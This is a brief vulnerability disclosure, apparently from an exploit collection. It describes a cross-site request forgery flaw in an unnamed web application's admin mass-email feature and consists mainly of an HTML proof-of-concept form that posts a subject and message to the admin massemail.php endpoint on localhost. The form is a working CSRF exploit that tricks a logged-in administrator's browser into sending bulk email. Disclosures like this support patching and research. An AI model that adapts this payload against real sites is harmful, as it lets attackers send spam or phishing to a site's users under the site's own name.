# Mass Mail CSRF
Allows to send mass emails to users through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/massemail.php" method="POST" style="padding: 25px;">
    <label for="subject">Subject</label>
    <input type="text" name="subject" id="subject" value="" class="form-control">
    <label for="content">Email Content</label>
    <textarea id="editor" name="content" class="form-control" style="min-height:250px;"></textarea><br>
    <div class="alert alert-info" role="alert"><b>Please Note:</b> HTML Tags do not work, line breaks and urls are automatically converted!</div>
    <input type="submit" name="send" value="Send Email" class="btn btn-default">
</form>
```
